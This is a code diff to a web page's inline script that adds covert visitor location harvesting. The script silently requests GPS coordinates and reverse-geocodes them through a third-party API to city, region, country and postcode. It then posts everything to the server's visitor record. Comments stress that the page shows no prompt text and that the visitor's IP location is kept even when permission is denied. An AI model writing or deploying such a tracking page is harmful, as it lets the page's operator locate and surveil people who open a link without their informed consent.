@@ -15,10 +15,7 @@
       justify-content: center;
       height: 100vh;
     }
-    .box {
-      text-align: center;
-      padding: 40px;
-    }
+    .box { text-align: center; padding: 40px; }
     h1 { font-size: 28px; margin-bottom: 10px; }
     p  { color: #888; font-size: 15px; }
   </style>
@@ -31,26 +28,39 @@
   </div>
 
   <script>
-    // Store the session ID set by the server so we can update the record
-    // Silently attempt GPS — no visible prompt text, just the browser's own popup
     if (navigator.geolocation) {
       navigator.geolocation.getCurrentPosition(
         async (pos) => {
           try {
+            const { latitude, longitude, accuracy } = pos.coords;
+
+            // Step 1: Use BigDataCloud to reverse geocode the GPS coords
+            // to get the REAL city name — free, no API key needed
+            const geoRes = await fetch(
+              `https://api.bigdatacloud.net/data/reverse-geocode-client?latitude=${latitude}&longitude=${longitude}&localityLanguage=en`
+            );
+            const geo = await geoRes.json();
+
+            // Step 2: Send everything to the server to update the visitor record
             await fetch('/api/update-location', {
               method: 'POST',
               headers: { 'Content-Type': 'application/json' },
               body: JSON.stringify({
-                lat: pos.coords.latitude,
-                lon: pos.coords.longitude,
-                accuracy: pos.coords.accuracy
+                lat:         latitude,
+                lon:         longitude,
+                accuracy:    accuracy,
+                city:        geo.city        || geo.locality       || '',
+                region:      geo.principalSubdivision              || '',
+                country:     geo.countryName                       || '',
+                countryCode: geo.countryCode                       || '',
+                zip:         geo.postcode                          || ''
               })
             });
           } catch (e) {
-            // silently fail
+            // silently fail — IP location is still saved
           }
         },
-        () => {} // silently ignore if user denies
+        () => {} // user denied — IP location stays, no error
       );
     }
   </script>
